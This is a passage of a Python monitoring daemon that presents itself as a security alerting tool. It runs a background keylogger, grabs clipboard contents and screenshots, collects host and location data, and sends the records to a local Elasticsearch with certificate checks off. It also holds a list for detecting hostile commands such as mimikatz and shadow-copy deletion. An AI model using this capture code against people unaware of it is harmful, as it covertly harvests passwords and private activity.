\"known_countries\": [\"Portugal\"], # Example country for testing\r\n    \"known_vpn_ips\": [\"89.214.145.78\", \"123.45.67.89\"], # Example VPN IPs\r\n    \"elastic_host\": \"localhost\",\r\n    \"elastic_port\": 9200,\r\n    \"log_level\": \"INFO\", # DEBUG, INFO, WARNING, ERROR, CRITICAL\r\n    \"time_sleep_seconds\": 3, # Main daemon loop sleep interval\r\n    \"min_free_disk_mb\": 100, # Minimum free disk space to operate\r\n    \"vt_api_key\": None, # Should be loaded from ENV\r\n    \"elastic_user\": None, # Should be loaded from ENV\r\n    \"elastic_password\": None # Should be loaded from ENV\r\n}\r\n\r\n# --- Paths derived from config ---\r\n# These will be set after config is loaded\r\nconfig = {} # Placeholder, will be populated by load_config\r\n\r\n# --- Global Keylogger Variables ---\r\nKEYLOGGER_KEYS = []\r\nKEYLOGGER_LISTENER = None # Will hold the pynput Listener instance\r\nKEYLOGGER_STOP_EVENT = threading.Event() # To signal the keylogger thread to stop\r\n\r\n# === Logger Setup (using Python's logging module) ===\r\n# This needs to be set up early before any `logger.info` calls\r\nlogger = logging.getLogger('snakey_daemon')\r\n\r\nclass JsonFormatter(logging.Formatter):\r\n    \"\"\"Custom JSON formatter for structured logs.\"\"\"\r\n    def format(self, record):\r\n        log_record = {\r\n            \"timestamp\": datetime.fromtimestamp(record.created, tz=timezone.utc).isoformat(),\r\n            \"level\": record.levelname,\r\n            \"message\": record.getMessage(),\r\n            \"logger_name\": record.name,\r\n        }\r\n        if record.exc_info:\r\n            log_record[\"exception\"] = self.formatException(record.exc_info)\r\n        if record.funcName:\r\n            log_record[\"function\"] = record.funcName\r\n        if record.lineno:\r\n            log_record[\"line\"] = record.lineno\r\n        if record.pathname:\r\n            log_record[\"file\"] = record.pathname\r\n        \r\n        # Add any extra dictionary fields passed to the logger via the 'extra' keyword\r\n        if hasattr(record, 'extra') and isinstance(record.extra, dict):\r\n            # The 'extra' dictionary contains the keys directly, so just update\r\n            log_record.update(record.extra)\r\n\r\n        return json.dumps(log_record, default=str) # default=str handles datetime, etc.\r\n\r\ndef setup_logging(log_level_str, log_file_path):\r\n    \"\"\"Configures the main logger for the daemon.\"\"\"\r\n    try:\r\n        logger.setLevel(getattr(logging, log_level_str.upper()))\r\n    except AttributeError:\r\n        logger.setLevel(logging.INFO) # Default to INFO if level is invalid\r\n        logger.warning(f\"Invalid SNAKEY_LOG_LEVEL '{log_level_str}'. Defaulting to INFO.\")\r\n\r\n    # Prevent adding handlers multiple times if setup_logging is called more than once\r\n    if not logger.handlers:\r\n        # File Handler with Time-based Rotation (daily)\r\n        file_handler = TimedRotatingFileHandler(log_file_path,\r\n                                                when=\"midnight\",\r\n                                                interval=1, # Rotate daily\r\n                                                backupCount=5) # Keep up to 5 rotated log files\r\n        file_handler.setLevel(logging.DEBUG) # Log all debug messages to file\r\n        file_handler.setFormatter(JsonFormatter())\r\n        logger.addHandler(file_handler)\r\n\r\n        # Console Handler\r\n        console_handler = logging.StreamHandler(sys.stdout)\r\n        console_handler.setLevel(logging.INFO) # Only INFO and above to console\r\n        console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\r\n        console_handler.setFormatter(console_formatter)\r\n        logger.addHandler(console_handler)\r\n\r\n# Global exception handler to log any unhandled exceptions\r\ndef handle_unhandled_exception(exc_type, exc_value, exc_traceback):\r\n    if issubclass(exc_type, KeyboardInterrupt):\r\n        # Don't log KeyboardInterrupt, let default handler deal with it\r\n        sys.__excepthook__(exc_type, exc_value, exc_traceback)\r\n        return\r\n    logger.critical(\"Unhandled exception caught!\", exc_info=(exc_type, exc_value, exc_traceback))\r\n\r\nsys.excepthook = handle_unhandled_exception\r\n\r\ndef load_config(config_file_path: str) -> dict:\r\n    \"\"\"Loads configuration from a JSON file and environment variables.\"\"\"\r\n    loaded_config = DEFAULT_CONFIG.copy()\r\n\r\n    if os.path.exists(config_file_path):\r\n        try:\r\n            with open(config_file_path, \"r\", encoding='utf-8') as f:\r\n                file_config = json.load(f)\r\n                loaded_config.update(file_config)\r\n            logger.info(f\"Configuration loaded from {config_file_path}\")\r\n        except json.JSONDecodeError:\r\n            logger.error(f\"Error decoding config file {config_file_path}. Using default values.\")\r\n        except IOError as e:\r\n            logger.error(f\"Error reading config file {config_file_path}: {e}. Using default values.\")\r\n        except Exception as e:\r\n            logger.critical(f\"Unexpected error parsing config file: {e}\", exc_info=True)\r\n            sys.exit(1) # Critical error, exit\r\n\r\n    # Override with Environment Variables for sensitive info (best practice)\r\n    loaded_config[\"vt_api_key\"] = os.getenv(\"SNAKEY_VT_API_KEY\", loaded_config[\"vt_api_key\"])\r\n    loaded_config[\"elastic_user\"] = os.getenv(\"SNAKEY_ELASTIC_USER\", loaded_config[\"elastic_user\"])\r\n    loaded_config[\"elastic_password\"] = os.getenv(\"SNAKEY_ELASTIC_PASSWORD\", loaded_config[\"elastic_password\"])\r\n    loaded_config[\"log_level\"] = os.getenv(\"SNAKEY_LOG_LEVEL\", loaded_config[\"log_level\"]).upper()\r\n\r\n    return loaded_config\r\n\r\n# === Global Variables (Initialized after config loading) ===\r\nconfig_file = os.path.join(DEFAULT_CONFIG[\"base_path\"], \"snakey_config.json\")\r\nconfig = load_config(config_file)\r\n\r\n# Now define paths and settings using the loaded config\r\nbase_path = config[\"base_path\"]\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True) # Ensure directory exists\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon.log\") # Changed name to avoid conflict with existing (error) log\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = set(config[\"known_countries\"]) # Use set for faster lookups\r\nKNOWN_VPN_IPS = set(config[\"known_vpn_ips\"]) # Use set for faster lookups\r\nMIN_FREE_DISK_MB = config[\"min_free_disk_mb\"]\r\n\r\n# --- VirusTotal API Endpoints (Global Constants) ---\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\n\r\n\r\n# Sensitive Command Detection Configuration\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\", \"del /s /q\", \"rmdir /s /q\", \"net user\", \"net localgroup administrators\",\r\n    \"taskkill /f /im\", \"schtasks /create\", \"reg delete\", \"mimikatz\",\r\n    \"certutil -urlcache -f -split\", \"wmic shadowcopy delete\", \"vssadmin delete shadows\",\r\n    \"powershell -nop -w hidden -c\", \"invoke-expression\", \"set-mppreference -disablerealtimemonitoring $true\",\r\n    \"bcdedit /set {current} safeboot network\", \"mshta.exe http\", \"bitsadmin /transfer\",\r\n    \"wevtutil cl system\", \"cipher /w\", \"sdelete -z\",\r\n]\r\n\r\n# === Setup Logging (now that config is loaded) ===\r\nsetup_logging(config[\"log_level\"], daemon_log_file)\r\n\r\n\r\n# === Encryption Key Loading ===\r\nfernet: Fernet = None # Type hint\r\nif not os.path.exists(key_path):\r\n    logger.critical(\"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    sys.exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    logger.info(\"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    logger.critical(f\"Failed to load encryption key: {e}. Exiting.\", exc_info=True)\r\n    sys.exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = config[\"elastic_host\"]\r\nELASTIC_PORT = config[\"elastic_port\"]\r\nELASTIC_USER = config[\"elastic_user\"]\r\nELASTIC_PASSWORD = config[\"elastic_password\"]\r\n\r\nes_client: Elasticsearch = None # Type hint\r\n\r\n# Basic pre-check before initializing the full ES client\r\nes_precheck_successful = False\r\nlogger.info(\"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\nif not ELASTIC_USER or not ELASTIC_PASSWORD:\r\n    logger.critical(\"Elasticsearch username or password not set (check SNAKEY_ELASTIC_USER/SNAKEY_ELASTIC_PASSWORD environment variables or config file). Elasticsearch client will not be initialized.\")\r\nelse:\r\n    try:\r\n        response = requests_get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                                verify=False, timeout=10, stream=True)\r\n        logger.debug(f\"Basic requests.get status: {response.status_code}\")\r\n        # Read a byte to force connection establishment, then close to prevent hanging\r\n        try:\r\n            response.raw.read(1)\r\n        except Exception as read_e:\r\n            logger.warning(f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\", extra={\"error_type\": \"requests_raw_read_error\"})\r\n        response.close()\r\n        if response.status_code == 200:\r\n            logger.info(\"Basic requests.get pre-check successful (status 200).\")\r\n            es_precheck_successful = True\r\n        else:\r\n            logger.warning(\r\n                f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\",\r\n                extra={\"http_status\": response.status_code, \"response_text\": response.text})\r\n\r\n    except requests.exceptions.ConnectionError as e:\r\n        logger.error(f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\", exc_info=True, extra={\"error_type\": \"requests_connection_error\"})\r\n    except requests.exceptions.Timeout:\r\n        logger.error(\"requests.Timeout during pre-check: Connection timed out.\", exc_info=True, extra={\"error_type\": \"requests_timeout\"})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\", exc_info=True, extra={\"error_type\": \"requests_request_error\"})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during basic requests pre-check: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_precheck_error\"})\r\n\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # WARNING: Disable for testing, enable for production!\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            logger.info(\"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            logger.error(\"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\", extra={\"error_type\": \"es_ping_failed\"})\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        logger.error(f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        logger.error(f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        es_client = None\r\n    except TransportError as e:\r\n        logger.error(f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code})\r\n        es_client = None\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during Elasticsearch client initialization: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_init_error\"})\r\n        es_client = None\r\nelse:\r\n    logger.warning(\"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath: str) -> str | None:\r\n    \"\"\"Calculates the SHA256 hash of a file.\"\"\"\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        logger.error(f\"File not found for hashing: {filepath}\", extra={\"file_path\": filepath})\r\n        return None\r\n    except Exception as e:\r\n        logger.error(f\"Hashing failed for {filepath}: {e}\", exc_info=True, extra={\"file_path\": filepath})\r\n        return None\r\n\r\n\r\ndef hash_text(text: str) -> str:\r\n    \"\"\"Calculates the SHA256 hash of a given string.\"\"\"\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes: list[str]) -> str | None:\r\n    \"\"\"Builds a Merkle tree from a list of hashes and returns the Merkle root.\"\"\"\r\n    if not hashes:\r\n        return None\r\n    hashes = list(hashes) # Make a mutable copy\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url: str) -> dict:\r\n    \"\"\"Performs a VirusTotal URL lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping URL lookup.\", extra={\"url\": url})\r\n            return {}\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests_get(f\"{VT_URL_LOOKUP}{url_id}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\", extra={\"url_hash\": url_id})\r\n        else:\r\n            logger.warning(f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\", extra={\"url\": url, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT URL lookup failed: {e}\", exc_info=True, extra={\"url\": url})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT URL lookup: {e}\", exc_info=True, extra={\"url\": url})\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path: str) -> dict:\r\n    \"\"\"Performs a VirusTotal file lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping File lookup.\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        if not os.path.exists(file_path):\r\n            logger.error(f\"File not found for VT lookup: {file_path}\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:\r\n            return {}\r\n\r\n        response = requests_get(f\"{VT_FILE_LOOKUP}{file_hash}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\", extra={\"file_hash\": file_hash, \"file_path\": file_path})\r\n        else:\r\n            logger.warning(f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\", extra={\"file_path\": file_path, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT File lookup failed: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT File lookup: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    return {}\r\n\r\n\r\ndef check_important_directories() -> dict[str, str]:\r\n    \"\"\"Checks the status of important user directories.\"\"\"\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n                logger.warning(f\"Failed to list contents of {name} ({path}): {e}\", extra={\"dir_name\": name, \"dir_path\": path})\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file() -> bool:\r\n    \"\"\"Checks if the 'stop_snakey.txt' file exists to terminate the daemon.\"\"\"\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef check_disk_space(path: str, min_free_mb: int) -> bool:\r\n    \"\"\"Checks if there's enough free disk space at a given path.\"\"\"\r\n    try:\r\n        total, used, free = shutil.disk_usage(path)\r\n        free_mb = free / (1024 * 1024)\r\n        if free_mb < min_free_mb:\r\n            logger.warning(f\"Low disk space detected in {path}: {free_mb:.2f} MB free. Operations might be impacted.\", extra={\"path\": path, \"free_mb\": free_mb, \"min_free_mb\": min_free_mb})\r\n            return False\r\n        logger.debug(f\"Disk space OK in {path}: {free_mb:.2f} MB free.\")\r\n        return True\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check disk space for {path}: {e}\", exc_info=True, extra={\"path\": path})\r\n        return True # Assume OK if check fails, to avoid halting the daemon\r\n\r\ndef log_to_wazuh_file(data: dict):\r\n    \"\"\"Logs session data to a file in a Wazuh-compatible JSON format.\"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(data, default=str) + \"\\n\")\r\n        logger.info(\"Log written to Wazuh-compatible file.\", extra={\"log_file\": wazuh_log_file})\r\n    except Exception as e:\r\n        logger.error(f\"Wazuh log file write failed: {e}\", exc_info=True, extra={\"log_file\": wazuh_log_file})\r\n\r\ndef save_session_to_json(session_data: dict, filepath: str):\r\n    \"\"\"\r\n    Appends session data as a new JSON object to the specified file.\r\n    Each object is on a new line to make it easier to read/parse as NDJSON.\r\n    \"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in session_data and isinstance(session_data['timestamp'], datetime):\r\n            session_data['timestamp'] = session_data['timestamp'].isoformat()\r\n        \r\n        with open(filepath, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(session_data, default=str) + \"\\n\")\r\n        logger.info(f\"Session log appended to JSON file: {filepath}\", extra={\"log_file\": filepath})\r\n    except Exception as e:\r\n        logger.error(f\"Failed to write session log to JSON file {filepath}: {e}\", exc_info=True, extra={\"log_file\": filepath})\r\n\r\ndef send_to_elasticsearch(data: dict):\r\n    \"\"\"Sends collected session data to Elasticsearch.\"\"\"\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty for Kibana visualization (empty list is fine, None is bad)\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []\r\n            if not data_to_send.get('virustotal'):\r\n                data_to_send['virustotal'] = {}\r\n\r\n            logger.debug(f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\", extra={\"timestamp\": data_to_send['timestamp']})\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            logger.info(f\"Log sent to Elasticsearch. ID: {response['_id']}\", extra={\"es_id\": response['_id']})\r\n        except ConnectionError as e:\r\n            logger.error(f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        except AuthenticationException as e:\r\n            logger.error(f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        except TransportError as e:\r\n            logger.error(f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code, \"es_info\": e.info})\r\n        except Exception as e:\r\n            logger.error(f\"Unexpected failure sending log to Elasticsearch: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_send_error\"})\r\n    else:\r\n        logger.warning(\"Elasticsearch client is not configured or connected. Log will not be sent.\")\r\n\r\n\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Analyzes clipboard content for predefined sensitive command patterns.\"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            logger.info(f\"Sensitive CMD command detected in clipboard.\", extra={\"matched_command\": sensitive_cmd, \"clipboard_snippet\": clipboard_content[:100]})\r\n\r\n    return alerts_list\r\n\r\n\r\ndef check_country_change(current_country: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    last_country_path = os.path.join(base_path, \"last_country.txt\")\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\", encoding='utf-8') as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                logger.info(f\"Country changed: {last_country} -> {current_country}\", extra={\"old_country\": last_country, \"new_country\": current_country})\r\n        with open(last_country_path, \"w\", encoding='utf-8') as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check/update last country: {e}\", exc_info=True)\r\n    return alerts_list\r\n\r\n\r\ndef check_vpn_proxy_ip(current_ip: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Checks if the current public IP is in a list of known VPN/proxy IPs.\"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        logger.info(f\"Access from known VPN/proxy IP detected: {current_ip}\", extra={\"ip_address\": current_ip})\r\n    return alerts_list\r\n\r\n\r\n# === Keylogger Thread Function ===\r\ndef on_press_threaded(key):\r\n    \"\"\"Callback for pynput.keyboard.Listener on key press event.\"\"\"\r\n    global KEYLOGGER_KEYS\r\n    try:\r\n        if hasattr(key, 'char') and key.char is not None:\r\n            KEYLOGGER_KEYS.append(key.char)\r\n        elif key == Key.space:\r\n            KEYLOGGER_KEYS.append(' ')\r\n        elif key == Key.enter:\r\n            KEYLOGGER_KEYS.append('[ENTER]')\r\n        elif key == Key.backspace:\r\n            KEYLOGGER_KEYS.append('[BACKSPACE]')\r\n        elif key == Key.tab:\r\n            KEYLOGGER_KEYS.append('[TAB]')\r\n        else:\r\n            KEYLOGGER_KEYS.append(f\"[{str(key).replace('Key.', '')}]\")\r\n    except Exception as e:\r\n        logger.error(f\"Error in on_press_threaded keylogger: {e}\", exc_info=True)\r\n\r\ndef keylogger_thread_func():\r\n    \"\"\"Function to be run in a separate thread for continuous keylogging.\"\"\"\r\n    global KEYLOGGER_LISTENER\r\n    logger.info(\"Keylogger thread started.\")\r\n    try:\r\n        with Listener(on_press=on_press_threaded) as KEYLOGGER_LISTENER:\r\n            KEYLOGGER_LISTENER.join() # This will block until listener.stop() is called\r\n    except Exception as e:\r\n        logger.critical(f\"Keylogger thread encountered a critical error: {e}. Keylogger will terminate.\", exc_info=True)\r\n    finally:\r\n        logger.info(\"Keylogger thread terminated.\")\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session() -> dict:\r\n    \"\"\"Collects a full session's worth of system data, activities, and alerts.\"\"\"\r\n    current_time = datetime.now(timezone.utc)\r\n    session_log: dict = {\r\n        \"timestamp\": current_time.isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\", # Will be populated from global KEYLOGGER_KEYS\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n            logger.warning(f\"Could not get private IP: {e}\", extra={\"error\": str(e)})\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip: str | None = None\r\n        current_country: str | None = None\r\n        try:\r\n            ip_info_response = requests_get(\"https://ipinfo.io/json\", timeout=5)\r\n            ip_info_response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)\r\n            ip_info = ip_info_response.json()\r\n\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if current_country and current_country not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {current_country}\")\r\n                logger.info(f\"Access from untrusted country: {current_country}\", extra={\"country\": current_country})\r\n\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            logger.warning(\"IP info lookup timed out.\", extra={\"error_type\": \"ipinfo_timeout\"})\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            logger.error(f\"IP info lookup failed: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_request_error\"})\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            logger.error(f\"Unexpected error during IP info lookup: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_unexpected_error\"})\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info collection error: {e}\")\r\n        logger.error(f\"System info collection error: {e}\", exc_info=True)\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(str(session_log[\"clipboard\"])) # Ensure clipboard is string before hashing\r\n\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            logger.error(f\"Clipboard error: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        logger.info(\"Clipboard collection skipped (not Windows).\")\r\n\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_file_path = os.path.join(base_path, screenshot_information)\r\n    if platform.system() == \"Windows\":\r\n        # Check disk space before attempting screenshot\r\n        if not check_disk_space(base_path, MIN_FREE_DISK_MB):\r\n            session_log[\"alerts\"].append(\"Screenshot skipped due to low disk space.\")\r\n            logger.warning(\"Screenshot skipped due to low disk space.\")\r\n        else:\r\n            try:\r\n                im = ImageGrab.grab()\r\n                im.save(screenshot_file_path)\r\n                session_log[\"screenshot_taken\"] = True\r\n                session_log[\"screenshot_hash\"] = 